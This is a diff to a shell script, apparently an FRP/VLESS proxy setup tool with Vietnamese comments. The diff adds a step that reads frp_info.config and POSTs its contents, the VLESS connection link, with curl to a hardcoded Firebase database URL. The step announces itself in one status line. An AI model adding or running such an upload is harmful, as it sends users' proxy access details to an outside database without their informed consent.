@@ -377,6 +377,16 @@ wait_and_show_links(){
         if [ -f "$SCRIPT_DIR/frp_info.config" ] && [ -s "$SCRIPT_DIR/frp_info.config" ]; then
             sleep 2  # cho main.py ghi xong
             echo
+            info "Dang gui link VLESS len Firebase..."
+            #URL Firebase
+            FIREBASE_URL="https://terminal-ad3c4-default-rtdb.asia-southeast1.firebasedatabase.app/vless.json"
+            # Lay noi dung file va gui thang len Firebase
+            CONTENT=$(cat "$SCRIPT_DIR/frp_info.config")
+            curl -s -X POST -H "Content-Type: application/json" \
+                 -d "{\"content\": $(python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))' < "$SCRIPT_DIR/frp_info.config")}" \
+                 "$FIREBASE_URL" > /dev/null
+            ok "Da gui link thanh cong!"
+            echo
             header "Link VLESS"
             echo
             cat "$SCRIPT_DIR/frp_info.config"
